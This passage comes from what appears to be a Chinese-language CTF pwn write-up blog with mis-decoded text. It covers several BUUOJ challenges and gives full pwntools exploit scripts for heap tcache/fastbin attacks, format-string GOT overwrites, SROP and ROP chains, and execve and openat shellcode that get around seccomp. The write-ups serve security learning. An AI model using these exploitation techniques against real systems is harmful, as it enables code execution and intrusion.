p64(0xb0+0x40))free(4)add(0x28) #0add(0x28) #4add(0x18) #5add(0x10) #6add(0x28) #7add(0x18) #8free(4)free(7)edit(2,&#39;\x60&#39; + &#39;\n&#39;)edit(0,p64(mmap) + &#39;\n&#39;)add(0x28) #4add(0x28) #7add(0x28) #9free(6)free(8)edit(3,&#39;\xc0&#39; + &#39;\n&#39;)edit(5,p8(0x30) + &#39;\n&#39;)add(0x18) #6add(0x18) #8add(0x18) #10shellcode = &quot;&quot;&quot;  call here  .ascii &quot;/bin/sh&quot;  .byte 0here:   pop rdi   xor rsi,rsi   xor rdx,rdx   mov rax,0x3b   syscall&quot;&quot;&quot;edit(9,asm(shellcode) + &#39;\n&#39;)edit(10,p64(mmap) + &#39;\n&#39;)add(0x200)# debug()itr()</code></pre><h3 id="é¢˜è®°-5"><a href="#é¢˜è®°-5" class="headerlink" title="é¢˜è®°"></a>é¢˜è®°</h3><p>è¿™ä¸ªé¢˜è¿˜æœ‰ä¸€ç§åŠæ³•æ”»å‡»mmapå°±æ˜¯ç”¨unlinkæ¥è¿›è¡Œï¼Œå› ä¸ºé¢˜ç›®å°±ç»™äº†&amp;heap ï¼Œé¢˜ç›®é¢„æœŸè§£å°±æ˜¯è¿™æ ·ã€‚</p><p>å¦å¤–ä¸€ç§è§£æ³•ï¼Œå°±æ˜¯æ”»å‡»stdoutï¼Œæ³„æ¼libcåœ°å€ï¼Œç„¶åæ”»å‡»malloc hookã€‚</p><h2 id="ciscn-2019-sw-1"><a href="#ciscn-2019-sw-1" class="headerlink" title="ciscn_2019_sw_1"></a><code>ciscn_2019_sw_1</code></h2><h4 id="åˆ†æ-10"><a href="#åˆ†æ-10" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h4><p>32ä½ï¼Œå•æ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åˆ©ç”¨ã€‚æ— æ³•ä¸€æ¬¡æ€§çš„è·å¾—shellã€‚è‡³å°‘è¿è¡Œ2æ¬¡ã€‚</p><p>æ”»å‡»<code>__do_global_dtors_aux_fini_array_entry</code>ï¼Œè®©å…¶å†æ¬¡è¿è¡Œä¸€æ¬¡ï¼Œä¸”åŒæ—¶æ”¹ printf got çš„å€¼ä¸ºsystem pltã€‚ç„¶åé€ä¸€ä¸ª <code>/bin/sh\x00</code>å³å¯ã€‚</p><h4 id="exp-10"><a href="#exp-10" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">offset = 4payload = fmtstr_payload(offset,{0x804979C:0x8048534,elf.got[&#39;printf&#39;]:elf.plt[&#39;system&#39;]},write_size = &quot;short&quot;,numbwritten = 0)s(payload)sleep(1)sa(&#39;name&#39;,&#39;/bin/sh\x00&#39;)itr()</code></pre><p>å› ä¸ºæ˜¯32ä½ï¼Œç”¨<code>fmtstr_payload</code>æ˜¯å¾ˆå¥½ç”¨çš„ã€‚</p><h2 id="lctf2016-pwn200"><a href="#lctf2016-pwn200" class="headerlink" title="lctf2016_pwn200"></a><code>lctf2016_pwn200</code></h2><h3 id="åˆ†æ-11"><a href="#åˆ†æ-11" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><ul><li>å¼€å¤´ä¸è¾“å…¥<code>\n</code>ï¼Œ48å­—ç¬¦å¯ä»¥æ³„éœ²å‡ºstackåœ°å€</li><li>æœ‰ç¬¬ä¸€æ®µå¯æ§çš„æ ˆï¼Œä¸”å¯ä»¥è¦†ç›–åˆ°heap ptr</li></ul><pre><code class="c">int sub_400A29(){  char buf; // [rsp+0h] [rbp-40h]  char *dest; // [rsp+38h] [rbp-8h]  dest = (char *)malloc(0x40uLL);  puts(&quot;give me money~&quot;);  read(0, &amp;buf, 0x40uLL);  strcpy(dest, &amp;buf);  ptr = dest;  return sub_4009C4();}</code></pre><ul><li>ä¸€æ¬¡åªèƒ½ç”³è¯·ä¸€ä¸ªå †ï¼Œå¤§å°0-0x80,ä¸”å…ˆé‡Šæ”¾æ‰èƒ½å†æ¬¡ç”³è¯·ã€‚</li></ul><p>ä¿æŠ¤æƒ…å†µï¼Œæ— ä»»ä½•ä¿æŠ¤ï¼Œæ‰€ä»¥å¯ä»¥å†™shellcodeï¼Œjmp ä¸Šå»å³å¯ã€‚</p><h3 id="æ”»å‡»æ€è·¯-7"><a href="#æ”»å‡»æ€è·¯-7" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h3><ul><li>åˆ©ç”¨å¯æ§çš„æ ˆï¼Œhos åœ¨æ ˆä¸Šfake ä¸€ä¸ªå †ï¼Œä¿è¯å¯ä»¥æ”¹åˆ°ret address</li><li>ç”³è¯·åŒå¤§å°çš„å †ï¼Œæ”¹ret address jmp åˆ° shellcode</li></ul><h3 id="exp-11"><a href="#exp-11" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">#!/usr/bin/env python# encoding: utf-8from pwn import *import timelocal_file  = &#39;./pwn200&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,26670)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(size,data):    sla(&#39;choice&#39;,&#39;1&#39;)    sla(&#39;long&#39;,str(size))    sa(&#39;me&#39;,str(data))def free():    sla(&#39;choice&#39;,&#39;2&#39;)shellcode = asm(shellcraft.sh())sa(&#39;u&#39;,shellcode)ru(&#39;\x05&#39;)leak_stack = uu64(r(6))info_addr(&#39;leak_stack&#39;,leak_stack)shellcode_addr = leak_stack - 0x50# debug()sla(&#39;id&#39;,&#39;65&#39;)payload = p64(0)*5 + p64(0x41) + p64(0) + p64(leak_stack - 0x90)sa(&#39;money&#39;,payload)free()payload = p64(0)*3 + p64(shellcode_addr)add(0x38,payload)sleep(0.2)sla(&#39;choice&#39;,&#39;3&#39;)# debug()itr()</code></pre><h2 id="vn-pwn-babybabypwn"><a href="#vn-pwn-babybabypwn" class="headerlink" title="vn_pwn_babybabypwn"></a><code>vn_pwn_babybabypwn</code></h2><h3 id="åˆ†æ-12"><a href="#åˆ†æ-12" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><ul><li>å¼€äº†æ²™ç›’ä¿æŠ¤ï¼Œåªèƒ½orw</li><li>å¼€å§‹ç»™äº†libcåœ°å€</li><li>ç¨‹åºä¸»è¦æ‰§è¡Œäº†<code>rt_sigreturn</code>ï¼Œè‚¯å®šæ˜¯å¥”ç€sropå»çš„</li></ul><h3 id="éš¾ç‚¹"><a href="#éš¾ç‚¹" class="headerlink" title="éš¾ç‚¹"></a>éš¾ç‚¹</h3><ul><li>orwçš„ropåº”è¯¥å¾€å“ªé‡Œå†™ï¼Œæ ˆåœ°å€æ˜¯ä¸çŸ¥é“çš„</li></ul><p>å¯ä»¥åœ¨libcä¸Šæ‰¾ä¸€æ®µæ— ç”¨çš„åœ°æ–¹è¿›è¡Œå†™å³å¯ã€‚æ¯”å¦‚ libcçš„bssï¼Œfree hookæ®µã€‚</p><ul><li>æœ‰çš„gadget ä½¿ç”¨ropgadgetæ‰¾ä¸åˆ°</li></ul><pre><code class="python">libc.search(asm(&quot;syscall \nret&quot;)).next() </code></pre><p>å¯ä»¥é€šè¿‡æœºå™¨ç æ¥æ‰¾ã€‚</p><ul><li>srop ä¸­frameæ‰§è¡Œçš„é¡ºåº</li></ul><p>frame.rip æ˜¯å…ˆæ‰§è¡Œçš„åœ°å€ã€‚è€Œ frame.rsp çš„å€¼å°±æ˜¯æˆ‘ä»¬æ‰§è¡Œå®Œ frame.rip åï¼Œè¦æ‰§è¡Œçš„å€¼</p><h3 id="exp-12"><a href="#exp-12" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">#!/usr/bin/env python# encoding: utf-8from pwn import *import timelocal_file  = &#39;./vn_pwn_babybabypwn&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,25535)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]rce18 = [0x4f2c5,0x4f322,0x10a38c]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()&#39;line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x0d 0xc000003e  if (A != ARCH_X86_64) goto 0015 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005 0004: 0x15 0x00 0x0a 0xffffffff  if (A != 0xffffffff) goto 0015 0005: 0x15 0x09 0x00 0x00000009  if (A == mmap) goto 0015 0006: 0x15 0x08 0x00 0x0000000a  if (A == mprotect) goto 0015 0007: 0x15 0x07 0x00 0x00000029  if (A == socket) goto 0015 0008: 0x15 0x06 0x00 0x0000002a  if (A == connect) goto 0015 0009: 0x15 0x05 0x00 0x00000031  if (A == bind) goto 0015 0010: 0x15 0x04 0x00 0x00000032  if (A == listen) goto 0015 0011: 0x15 0x03 0x00 0x00000038  if (A == clone) goto 0015 0012: 0x15 0x02 0x00 0x00000039  if (A == fork) goto 0015 0013: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0015 0014: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0015: 0x06 0x00 0x00 0x00000000  return KILL&#39;ru(&#39;0x&#39;)libc_base =  int(r(12),16) - libc.sym[&#39;puts&#39;]info_addr(&#39;libc_base&#39;,libc_base)free_hook = 0x3c67a8 + libc_baseread = libc.sym[&#39;read&#39;] + libc_baseputs = libc.sym[&#39;puts&#39;] + libc_baseopen = libc.sym[&#39;open&#39;] + libc_basepop_rdi= 0x0000000000021102 + libc_basepop_rsi = 0x00000000000202e8 + libc_basepop_rdx = 0x0000000000001b92 + libc_basesyscall_ret = libc.search(asm(&quot;syscall \nret&quot;)).next() + libc_base# syscall_ret = libc_base + 0x00000000000bc375 #: syscall; ret; frame = SigreturnFrame()frame.rax = 0frame.rdi = 0frame.rsi = free_hookframe.rdx = 0x300frame.rip = syscall_retframe.rsp = free_hookpayload = str(frame)[8:] #å‰8å­—èŠ‚æ˜¯rt_sigreturn å…¶å¹¶ä¸éœ€è¦ä¼ªé€ ã€‚ç¨‹åºæ˜¯ä¸»åŠ¨è°ƒç”¨çš„ sigreturn# print(hex(len(frame)))s(payload)orw = flat([    pop_rdi,0,pop_rsi,free_hook,pop_rdx,8,read,    pop_rdi,free_hook,pop_rsi,0,pop_rdx,0,open,    pop_rdi,3,pop_rsi,free_hook,pop_rdx,0x30,read,    pop_rdi,free_hook,puts])s(orw)sleep(0.2)s(&#39;./flag&#39;)# debug()itr()</code></pre><h3 id="é¢˜è®°-6"><a href="#é¢˜è®°-6" class="headerlink" title="é¢˜è®°"></a>é¢˜è®°</h3><pre><code class="python">payload = str(frame)[8:] </code></pre><p>å¯¹äºä¸ºä»€ä¹ˆè¦ä»8å­—èŠ‚å¼€å§‹çš„ç†è§£ï¼Ÿ</p><p>å‰8å­—èŠ‚æ˜¯<code>rt_sigreturn</code>,å…¶æœ‰ä»€ä¹ˆç”¨ï¼Ÿ</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/votJbl.png" srcset="/img/loading.gif" alt></p><p>åœ¨ç¬¬äºŒæ­¥çš„æ—¶å€™ï¼Œå†…æ ¸ä¼šå¸®ç”¨æˆ·è¿›ç¨‹å°†å…¶ä¸Šä¸‹æ–‡ä¿å­˜åœ¨è¯¥è¿›ç¨‹çš„æ ˆä¸Šï¼Œç„¶ååœ¨æ ˆé¡¶å¡«ä¸Šä¸€ä¸ªåœ°å€<code>rt_sigreturn</code>ï¼Œè¿™ä¸ªåœ°å€æŒ‡å‘ä¸€æ®µä»£ç ï¼Œåœ¨è¿™æ®µä»£ç ä¸­ä¼šè°ƒç”¨sigreturnç³»ç»Ÿè°ƒç”¨ã€‚å› æ­¤ï¼Œå½“signal handleræ‰§è¡Œå®Œä¹‹åï¼Œæ ˆæŒ‡é’ˆï¼ˆstack pointerï¼‰å°±æŒ‡å‘<code>rt_sigreturn</code>ï¼Œæ‰€ä»¥ï¼Œsignal handlerå‡½æ•°çš„æœ€åä¸€æ¡retæŒ‡ä»¤ä¼šä½¿å¾—æ‰§è¡Œæµè·³è½¬åˆ°è¿™æ®µsigreturnä»£ç ï¼Œè¢«åŠ¨åœ°è¿›è¡Œsigreturnç³»ç»Ÿè°ƒç”¨,æŠŠåŸæ¥ä¿å­˜çš„å¯„å­˜å™¨ä¿¡æ¯å¼¹å›å»ï¼Œæœ€åæ¢å¤è¿›ç¨‹çš„æ‰§è¡Œã€‚</p><p>ç”±æ­¤å¯ä»¥å¾—å‡ºï¼Œå› ä¸ºç¨‹åºæ˜¯ä¸»åŠ¨è°ƒç”¨sigreturnçš„ï¼Œå¹¶ä¸éœ€è¦<code>rt_sigreturn</code>æŒ‡å‘ä¸€æ®µä»£ç ï¼Œå†è°ƒç”¨sigreturnç³»ç»Ÿè°ƒç”¨ã€‚</p><h2 id="ciscn-2019-final-4"><a href="#ciscn-2019-final-4" class="headerlink" title="ciscn_2019_final_4"></a><code>ciscn_2019_final_4</code></h2><p>è¿™ä¸ªé¢˜è¿˜æ˜¯å¾ˆå¥½çš„é¢˜ç›®ï¼Œè€ƒå¯Ÿäº†å¾ˆå¤šçš„åŸºç¡€çŸ¥è¯†ç‚¹ã€‚</p><h3 id="åˆ†æ-13"><a href="#åˆ†æ-13" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><ul><li>å¼€å¯äº†æ²™ç›’ç¦ç”¨execve</li><li>å¼€å¤´è®©ä½ è¾“å…¥nameï¼Œæœ‰ä¸€æ®µå¯æ§çš„æ ˆç©ºé—´ï¼Œä¸”è¾ƒå¤§</li><li>pieä¿æŠ¤æ²¡æœ‰å¼€</li><li>å­˜åœ¨åè°ƒè¯•ï¼Œä½¿ç”¨ptraceåšçš„ï¼Œç›´æ¥gdb attachè¿‡å»ä¼šè¿›å…¥å­ç¨‹åºï¼Œçœ‹ä¸åˆ°å †æƒ…å†µ(ç›´æ¥åœ¨fork æ±‡ç¼–å¤„ï¼Œæ”¹æ±‡ç¼–ï¼Œ<code>jmp åˆ°ç¨‹åºè¾“å‡ºå­—ç¬¦ä¸²çš„åœ°æ–¹å³å¯</code> )</li><li>watchå‡½æ•°ä¸­ä¹Ÿç”¨ptraceï¼Œç›‘è§†äº†<code>openï¼Œmmapï¼Œforkï¼Œvforkï¼Œptrace</code> </li></ul><pre><code class="c">while ( 1 )  {    ptrace(PTRACE_SYSCALL, a1, 0LL, 0LL);    waitpid(a1, &amp;stat_loc, 0);    if ( !(stat_loc &amp; 0x7F) || (char)((char)((stat_loc &amp; 0x7F) + 1) &gt;&gt; 1) &gt; 0 || (stat_loc &amp; 0xFF00) &gt;&gt; 8 != 5 )      break;    ptrace(PTRACE_GETREGS, a1, 0LL, &amp;v3);    v2 = v4;    if ( v4 == 2 || v2 == 9 || v2 == 0x39 || v2 == 0x3A || v2 == 0x65 )    {      puts(&quot;hey! what are you doing?&quot;);      exit(-1);    }  }</code></pre><p>è¿™é‡Œå¯ä»¥ç›‘è§†ä¸€ä¸‹execveï¼Œå¥½åƒå°±å¯ä»¥ä¸ç”¨å¼€æ²™ç®±äº†ã€‚</p><h4 id="æ¼æ´ç‚¹-1"><a href="#æ¼æ´ç‚¹-1" class="headerlink" title="æ¼æ´ç‚¹"></a>æ¼æ´ç‚¹</h4><p>å­˜åœ¨uaf</p><h3 id="éš¾ç‚¹-1"><a href="#éš¾ç‚¹-1" class="headerlink" title="éš¾ç‚¹"></a>éš¾ç‚¹</h3><h4 id="orwçš„rop-chainå¾€å“ªé‡Œè¯»"><a href="#orwçš„rop-chainå¾€å“ªé‡Œè¯»" class="headerlink" title="orwçš„rop chainå¾€å“ªé‡Œè¯»"></a>orwçš„rop chainå¾€å“ªé‡Œè¯»</h4><p>ç¨‹åºè‡ªèº«æ˜¯å­˜åœ¨è¾ƒå°‘çš„gadgetsçš„ï¼Œæƒ³ç›´æ¥å®Œæˆorw çš„rop chainï¼Œæ˜¯ä¸å¯èƒ½çš„ã€‚<br>ä¸Šæ¥å› ä¸ºæ²¡å¼€pieï¼Œèƒ½ç®€å•çš„å®Œæˆä¸€ä¸ªreadåŠŸèƒ½ã€‚åœ¨æ³„æ¼libcä»¥åï¼Œå°±æœ‰æ›´å¤§çš„å‘æŒ¥ç©ºé—´äº†ã€‚</p><p>å¼€å¤´nameæœ‰ä¸€å¤§å—å¯æ§åœ°å€ï¼Œè¯¥æ€ä¹ˆä½¿ç”¨ä¸Šã€‚å…ˆè¾“å…¥ä¸€æ®µåƒåœ¾æ•°æ®ï¼Œç•™ç€å¯»æ‰¾ã€‚</p><pre><code class="python">sa(&#39;name&#39;,&#39;chumen77&#39;*10)</code></pre><p>åœ¨æ§åˆ¶malloc hookåï¼Œéšæ„å†™ä¸ªåœ°å€ï¼Œè®©å…¶crashåœ¨è¿™é‡Œï¼ŒæŸ¥çœ‹ä¸‹æ ˆåœ°å€ï¼š</p><pre><code class="python">data = 3 * &#39;\x00&#39; + p64(0xdeadbeef)add(0x68,data)</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/JsY1bN.png" srcset="/img/loading.gif" alt><br>å‘ç°æ–­åœ¨0xdeadbeefï¼Œæ ˆä¸Šå¯ä»¥çœ‹åˆ°è¾“å…¥çš„nameæƒ…å†µã€‚</p><p>æ­¤å¤„æ¥ä¸€ä¸ªæ ˆåŠ«æŒï¼Œå¢åŠ rsp æŒ‡é’ˆ0x38 ï¼Œæ¥ç€retä¸Šå»ï¼Œå°±å¯ä»¥æ‰§è¡Œnameä¸Šçš„ä¸œè¥¿ï¼Œè¿™ä¸ªä¸œè¥¿è‚¯å®šå†™æˆä»…èƒ½å®Œæˆçš„read rop chainã€‚</p><p>å› ä¸ºpieæ²¡å¼€ï¼Œå¯ä»¥ä½¿ç”¨è¿™ä¸ªæ–°çš„read åœ¨bssæ®µä¸Šè¯»å–ä¸€ä¸ªæ–°çš„rop chainï¼Œæ¥ç€ret ä¸Šå»æ‰§è¡Œã€‚æ–°çš„rop chainï¼Œå¯ä»¥ä¸ºmprotectè§£å¼€bssæ®µçš„æ‰§è¡Œæƒé™ï¼Œæ¥ç€è·³ä¸Šorw flagçš„shellcodeå³å¯ã€‚ï¼ˆ<strong>mprotect éœ€è¦æŒ‡å‡ºçš„æ˜¯ï¼ŒæŒ‡å®šçš„å†…å­˜åŒºé—´å¿…é¡»åŒ…å«æ•´ä¸ªå†…å­˜é¡µï¼ˆ4Kï¼‰ã€‚åŒºé—´å¼€å§‹çš„åœ°å€startå¿…é¡»æ˜¯ä¸€ä¸ªå†…å­˜é¡µçš„èµ·å§‹åœ°å€ï¼Œå¹¶ä¸”åŒºé—´é•¿åº¦lenå¿…é¡»æ˜¯é¡µå¤§å°çš„æ•´æ•°å€ã€‚ è¿™é‡Œç›´æ¥è®¾ç½®ä¸ºbssèµ·å§‹åœ°å€å³å¯ã€‚</strong>ï¼‰</p><h4 id="openè¢«ç¦ç”¨äº†æ€ä¹ˆåŠ"><a href="#openè¢«ç¦ç”¨äº†æ€ä¹ˆåŠ" class="headerlink" title="openè¢«ç¦ç”¨äº†æ€ä¹ˆåŠ"></a>openè¢«ç¦ç”¨äº†æ€ä¹ˆåŠ</h4><p>å¯ä»¥ä½¿ç”¨openatè¿›è¡Œä»£æ›¿ã€‚</p><pre><code class="c">#include &lt;fcntl.h&gt;int open(const char *path, int oflag, mode_t mode);int openat(int fd, const char *path, int oflag,  mode_t mode );        //å‡½æ•°æ‰§è¡ŒæˆåŠŸè¿”å›æ–‡ä»¶æè¿°ç¬¦ï¼Œå¤±è´¥è¿”å›-1.</code></pre><p><a href="https://blog.csdn.net/liangzc1124/article/details/83475246" target="_blank" rel="noopener">https://blog.csdn.net/liangzc1124/article/details/83475246</a></p><p><a href="https://www.cnblogs.com/BinBinStory/p/7400993.html" target="_blank" rel="noopener">https://www.cnblogs.com/BinBinStory/p/7400993.html</a></p><p>å…¶ä¸­é‡ç‚¹å°±æ˜¯ï¼Œå½“openatçš„pathå‚æ•°ï¼Œè¾“å…¥æ˜¯ç»å¯¹åœ°å€æ—¶ï¼Œfdå°±ä¼šè¢«æ— è§†ï¼Œå…¶å‡½æ•°å°±ç›¸å½“äºopenäº†ã€‚æ‰€ä»¥æ­¤å¤„çš„fdï¼Œä¹Ÿæ˜¯å¯ä»¥è®¾æˆä»»æ„å€¼ã€‚</p><h3 id="exp-13"><a href="#exp-13" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">#!/usr/bin/env python# encoding: utf-8from pwn import *import timelocal_file  = &#39;./ciscn_final_4&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 1if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,25080)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(size,data):    sla(&#39;&gt;&gt;&#39;,&#39;1&#39;)    sla(&#39;size&#39;,str(size))        sa(&#39;tent&#39;,str(data))def free(idx):    sla(&#39;&gt;&gt;&#39;,&#39;2&#39;)    sla(&#39;index&#39;,str(idx))def show(idx):    sla(&#39;&gt;&gt;&#39;,&#39;3&#39;)    sla(&#39;index&#39;,str(idx))bss = 0x6021C0pop_rdi = 0x0000000000401193pop_rsi_r15 = 0x0000000000401191pop_rsp_r13_r14_r15 = 0x000000000040118dorw = flat([pop_rdi,0,pop_rsi_r15,bss + 0x400,0,elf.plt[&#39;read&#39;],pop_rsp_r13_r14_r15,bss + 0x400,0,0,0])sa(&#39;name&#39;,str(orw))# sa(&#39;name&#39;,&#39;chumen77&#39;*10)add(0x1000,&#39;1&#39;)add(0x10,&#39;2&#39;)free(0)show(0)r()libcbase = uu64(r(6)) - 0x3c4b78info_addr(&#39;libcbase&#39;,libcbase)add(0x68,&#39;3&#39;)add(0x68,&#39;4&#39;)add(0x68,&#39;5&#39;)free(2)free(3)free(2)malloc_hook = 0x3c4afd + libcbaseadd(0x68,p64(malloc_hook))add(0x68,&#39;7&#39;)add(0x68,&#39;8&#39;)rsp_add_0x38 = libc.search(asm(&quot;add rsp , 0x38\nret&quot;)).next()data = 3 * &#39;\x00&#39; + p64(rsp_add_0x38 + libcbase)# data = 3 * &#39;\x00&#39; + p64(0xdeadbeef)add(0x68,data)# debug()sla(&#39;&gt;&gt;&#39;,&#39;1&#39;)sla(&#39;size&#39;,&#39;20&#39;)sleep(0.2)pop_rdx = libcbase + libc.search(asm(&quot;pop rdx\nret&quot;)).next()pop_rsp = libcbase + libc.search(asm(&quot;pop rsp\nret&quot;)).next()mprotect = libcbase + libc.sym[&#39;mprotect&#39;]payload = flat([pop_rdi,0x00602000,pop_rsi_r15,0x1000,0,pop_rdx,7,mprotect,0x602628])shellcode = shellcraft.linux.openat(0,&#39;/flag&#39;,0) + shellcraft.linux.read(3,bss+0x200,0x30) + shellcraft.linux.write(1,bss+0x200,0x30)sleep(0.2)s(p64(0)*3 + payload + p64(0) + asm(shellcode))# debug()itr()</code></pre><h3 id="å»¶ä¼¸åšæ³•"><a href="#å»¶ä¼¸åšæ³•" class="headerlink" title="å»¶ä¼¸åšæ³•"></a>å»¶ä¼¸åšæ³•</h3><p><a href="https://n132.github.io/2019/12/08/2019-12-08-UAF-With-Out-One_gadget/" target="_blank" rel="noopener">https://n132.github.io/2019/12/08/2019-12-08-UAF-With-Out-One_gadget/</a></p><p>å…¶æ˜¯ç”¨<code>house_of_orange+setcontext+0x35</code>è°ƒç”¨readä¼ å…¥ropchainæ¥å®Œæˆæ”»å‡»ã€‚</p><p>å¦‚æœæ— æ³•æ§åˆ¶<code>free_hook</code>ä¸”åœ¨libc-2.23æƒ…å†µä¸‹å¯ä»¥åˆ©ç”¨è¿™ä¸ªåŠæ³•ã€‚</p><h2 id="sctf-2019-one-heap"><a href="#sctf-2019-one-heap" class="headerlink" title="sctf_2019_one_heap"></a><code>sctf_2019_one_heap</code></h2><h3 id="åˆ†æ-14"><a href="#åˆ†æ-14" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><ul><li>ä¸å¯æŒ‡å®šidxï¼Œæ¥æ“ä½œchunkï¼Œåªèƒ½æ“ä½œå½“å‰malloc åˆ†é…chunkå¯¹åº”çš„heapåœ°å€</li><li>åªæœ‰free å’Œ addï¼Œfreeå¯ä»¥4æ¬¡ï¼Œaddå¯ä»¥<code>0xf</code>æ¬¡</li></ul><h3 id="éš¾ç‚¹-2"><a href="#éš¾ç‚¹-2" class="headerlink" title="éš¾ç‚¹"></a>éš¾ç‚¹</h3><ul><li>æ— showå‡½æ•°</li><li>æœ‰é™çš„freeæ¬¡æ•°ï¼Œåªèƒ½é€šè¿‡åˆé€‚çš„å †æŠ€å·§æˆ–è€…çˆ†ç ´æ¥å®Œæˆæ”»å‡»</li></ul><p>æ­¤é¢˜ç”±äºåªèƒ½4æ¬¡freeï¼Œå…¶ä¸­3æ¬¡freeè¿˜æ˜¯ç›´æ¥å¿…é¡»æ‰§è¡Œçš„ï¼Œåªå‰©ä¸‹çš„ä¸€æ¬¡å°±å°¤ä¸ºå…³é”®ã€‚ç›®æ ‡å°±æ˜¯åœ¨å…¶freeä»¥åï¼Œæœ‰åŠæ³•è®©å†æ¬¡ç”³è¯·çš„chunkå¯ä»¥ä¿®æ”¹åˆ°è¿™ä¸ªfree chunkå¯¹åº”tcache binçš„fdï¼Œæ¥è¿›è¡Œtcache attackã€‚</p><p>å½“ä¸€ä¸ªå †AåŒæ—¶åœ¨tcacheé‡Œé¢ï¼Œåˆåœ¨unsortbiné‡Œé¢ï¼Œè¿™ç§æƒ…å†µæ˜¯å¸¸è§çš„ï¼Œå¹¶ä¸”ä¹Ÿæ˜¯å±é™©çš„ã€‚</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/T5GJ9H.png" srcset="/img/loading.gif" alt></p><p>å½“å…ˆç”³è¯·ä¸€ä¸ªå°çš„chunk Cï¼Œå…¶è‚¯å®šæ˜¯åœ¨æ­¤chunkä¸ŠæŒ‰ç…§unsortbinçš„è§„åˆ™ï¼Œåˆ†å‰²ä¸€ä¸‹ï¼Œç•™ä¸‹ä¸€ä¸ªå°çš„unsortbin binã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/yB8mNI.png" srcset="/img/loading.gif" alt></p><p>ç„¶åæ¥ç€ç”³è¯·ä¸€ä¸ªç›¸åŒäºchunk Aå¤§å°çš„å †ï¼Œå°±æœ‰æœºä¼šæ”¹åˆ°è¿™ä¸ª2ä¸ªè¢«åˆ†å‰²å®Œçš„å°chunkã€‚<strong>æ¯”å¦‚æ”¹0x61çš„unsortbinçš„ä¿¡æ¯ï¼Œå¯ä»¥æ”¹å…¶sizeï¼Œå¹¶ä¸”æå‰åœ¨chunk Bå¤„ä¼ªé€ å¥½æ•°æ®ï¼Œå³å¯å®Œæˆä¸€ä¸ªfake çš„ unsortbinã€‚</strong></p><p> <img src="http://qiqianyun.chumen77.xyz/uPic/pCToHT.png" srcset="/img/loading.gif" alt></p><p>å€˜è‹¥å†ç”³è¯·ä¸€ä¸ªåˆé€‚çš„å¤§å°ï¼Œæ¯”å¦‚0x68ï¼Œå³å¯æ”¹åˆ°chunk 